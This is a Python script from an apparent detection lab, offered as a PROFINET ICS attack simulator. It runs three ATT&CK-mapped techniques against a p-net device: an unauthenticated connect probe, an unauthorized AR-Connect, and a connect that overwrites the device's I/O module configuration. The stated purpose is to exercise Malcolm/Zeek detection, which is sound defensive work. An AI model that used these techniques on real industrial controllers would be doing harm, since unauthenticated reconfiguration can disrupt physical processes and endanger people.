"""PROFINET ICS attack simulator — triggers detection for the PROFINET
IO-Device (`p-net`, a real C stack, RT-Labs' spec-compliant reference
implementation), which has no authentication in this configuration (matching
real-world PROFINET deployments, which have none by default) — every
technique below is just a normal AR-Connect aimed at someone else's device,
no credentials needed.

Malcolm's ACID package only has detection tables for S7comm/CIP/BACnet (see
reference_ot_ics_acid_triggers memory) — PROFINET gets no free ACID technique
tags here, same gap as Modbus/DNP3/OPC-UA/FINS. PROFINET has its own custom
OpenSearch Alerting monitor + "PROFINET Detection Overview" dashboard instead
(linux/configure_profinet_alerting), same pattern as every other
non-ACID-covered protocol here.

**Zeek/Malcolm visibility gotcha, unique to this protocol**: PROFINET's DCP
service (device discovery/identify/signal/set — raw Ethernet, EtherType
0x8892, no IP layer at all) produces ZERO log entries in Malcolm — confirmed
empirically by running a real `signal` command and checking OpenSearch for
that exact time window (zero hits). Only the UDP/IP-based AR-Connect/RPC
exchange (destination port 34964, `network.protocol: "profinet"` /
`"profinet_io_cm"`) is Zeek-visible. Every technique below is therefore built
on a real Connect-request variant (not DCP), unlike this lab's other
protocols where cheap read/recon primitives are directly visible.

**A real bug in `profinet-py` (f0rw4rd/profinet-py v0.6.2) was found and
worked around while building this** — its own `ProfinetDevice.start_cyclic()`
/ `cyclic` CLI subcommand always fails against `p-net`, because they first
issue a plain acyclic connect (AR type 0x0006, "DeviceAccess") that `p-net`
flatly refuses (an explicit p-net stack limitation, not a bug in p-net) before
ever attempting the real IOCR connect. Confirmed via a `tshark`-decoded
capture, not just the CLI's own (byte-order-confused, misleading) error
text. See `profinet_logic.py`'s module docstring for the full story and the
workaround (call `RPCCon.connect(iocr_setup=...)` directly, bypassing
`ProfinetDevice` entirely).

Full live cyclic *data* exchange (not just AR/IOCR negotiation) hits a
further, DIFFERENT wall — p-net aborts with a real-time alarm ("PDev: no
port offers required speed/duplexity") since virtio virtual NICs don't
report a real link speed the way PROFINET's real-time port validation
expects from physical hardware. Not chased further (2026-07-05) — the
AR/IOCR-negotiation traffic alone is already rich, real, and fully
Zeek-visible, which is all detection/ATT&CK-technique purposes need.

Three techniques, mapped to MITRE ATT&CK for ICS:
  T0846 Remote System Discovery — unauthenticated acyclic "DeviceAccess"
    connect probe. p-net doesn't support this AR type at all so it's always
    refused, but the probe itself is a real, logged Connect request/response
    — the recon act is what matters, not whether it succeeds.
  T0855 Unauthorized Command Message — a full, unauthorized AR-Connect with
    real IOCR (cyclic I/O) negotiation using the device's own standard
    8-byte-in/8-byte-out module — succeeds against p-net (AR + IOCR
    established, `has_cyclic=True`), same as a real engineering station
    connecting without any authorization check.
  T0836 Modify Parameter — a second AR-Connect declaring a DIFFERENT module
    in the same slot (the "echo" module instead of the standard digital
    in/out module) — the device reactively re-plugs whatever the connect
    request declares (p-net has no fixed hardware config to defend), so this
    represents an attacker overwriting the device's I/O parameterization.

Runs from kali-1, on a DIFFERENT VLAN than the PROFINET device (routed
through vyos-1) — unlike every other protocol here, PROFINET's own device
discovery (DCP) is raw Ethernet multicast and can't cross that routed
boundary at all (confirmed empirically: DCP-based resolution fails outright
from kali-1). The actual AR-Connect/RPC exchange, however, uses a normal
`(ip, port)` UDP socket peer and routes through vyos-1 fine — so this script
resolves the target by a known static IP + p-net's own fixed vendor/device
ID (see profinet_logic.StaticDeviceInfo) instead of DCP, exactly the way
every other protocol's kali script here already takes `--target <ip>`
directly rather than a station name.

Usage:
    python3 profinet_attack.py --target 192.168.80.10
"""

from __future__ import annotations

import argparse
import logging

from profinet_logic import (
    ALT_SLOT,
    DEFAULT_SLOT,
    acyclic_probe_connect,
    resolve_device_by_ip,
    unauthorized_iocr_connect,
)

log = logging.getLogger("profinet_attack")


def recon(target_ip: str, interface: str) -> None:
    log.info("[T0846 Remote System Discovery] unauthenticated acyclic 'DeviceAccess' connect probe")
    info, src_mac = resolve_device_by_ip(target_ip, "profinet-server", interface)
    conn, exc = acyclic_probe_connect(info, src_mac)
    try:
        if exc is None:
            log.info("acyclic connect unexpectedly succeeded (no credentials required)")
        else:
            log.info(
                "probe rejected by device (%s) -- attempt itself is now logged, no credentials required",
                exc,
            )
    finally:
        conn.close()


def unauthorized_connect(target_ip: str, interface: str) -> None:
    log.info("[T0855 Unauthorized Command Message] unauthorized AR-Connect with real IOCR negotiation")
    info, src_mac = resolve_device_by_ip(target_ip, "profinet-server", interface)
    conn, result = None, None
    try:
        conn, result = unauthorized_iocr_connect(info, src_mac, DEFAULT_SLOT)
        log.info(
            "AR-Connect accepted -- has_cyclic=%s input_frame_id=%s output_frame_id=%s (no credentials required)",
            getattr(result, "has_cyclic", None),
            getattr(result, "input_frame_id", None),
            getattr(result, "output_frame_id", None),
        )
    except Exception as exc:
        log.error("unauthorized-connect FAILED -- %s", exc)
    finally:
        if conn is not None:
            conn.close()


def tamper_parameter(target_ip: str, interface: str) -> None:
    log.info("[T0836 Modify Parameter] overwriting I/O module parameterization with a different module")
    info, src_mac = resolve_device_by_ip(target_ip, "profinet-server", interface)
    conn, result = None, None
    try:
        conn, result = unauthorized_iocr_connect(info, src_mac, ALT_SLOT)
        log.info(
            "AR-Connect with ALT module accepted -- device replugged its I/O config to match, has_cyclic=%s (no credentials required)",
            getattr(result, "has_cyclic", None),
        )
    except Exception as exc:
        log.error("tamper-parameter FAILED -- %s", exc)
    finally:
        if conn is not None:
            conn.close()


def attack(target_ip: str, interface: str) -> None:
    recon(target_ip, interface)
    unauthorized_connect(target_ip, interface)
    tamper_parameter(target_ip, interface)
    log.info("Attack sequence complete.")


def main() -> None:
    parser = argparse.ArgumentParser(description="PROFINET ACID/ATT&CK ICS attack simulator")
    parser.add_argument("--target", required=True, help="PROFINET IO-Device IP (e.g. 192.168.80.10)")
    parser.add_argument("--interface", default="eth1", help="Network interface to use (default: eth1)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    attack(args.target, args.interface)


if __name__ == "__main__":
    main()
